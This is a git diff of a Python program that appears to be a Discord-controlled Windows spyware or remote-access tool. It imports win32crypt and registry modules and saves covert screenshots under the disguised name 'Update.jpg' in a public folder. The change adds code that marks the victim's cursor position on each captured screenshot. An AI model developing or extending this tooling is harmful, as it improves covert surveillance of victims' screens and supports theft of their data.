@@ -14,7 +14,7 @@ import shutil
 import win32crypt
 import subprocess
 import winreg as reg
-from PIL import Image
+from PIL import Image, ImageDraw
 from discord.ext import commands
 import win32api, win32con, win32gui, win32ui
 
@@ -146,9 +146,16 @@ def getScreenshot(path=None):
         cDC.SelectObject(dataBitMap)
         cDC.BitBlt((0, 0), (W, H), dcObj, (0, 0), win32con.SRCCOPY)
 
+        # Capture the cursor position
+        cursor_x, cursor_y = win32api.GetCursorPos()
+        cursor_radius = 2  # You can adjust the size
+
         if path == None:
             dataBitMap.SaveBitmapFile(cDC, 'C:\\Users\\Public\\Downloads\\Update.jpg')
             img = Image.open('C:\\Users\\Public\\Downloads\\Update.jpg')
+            draw = ImageDraw.Draw(img)
+            draw.ellipse([cursor_x - cursor_radius, cursor_y - cursor_radius,
+                      cursor_x + cursor_radius, cursor_y + cursor_radius], fill='red')
             img.save('C:\\Users\\Public\\Downloads\\Update.jpg', optimize=True)
         else:
             dataBitMap.SaveBitmapFile(cDC, path)
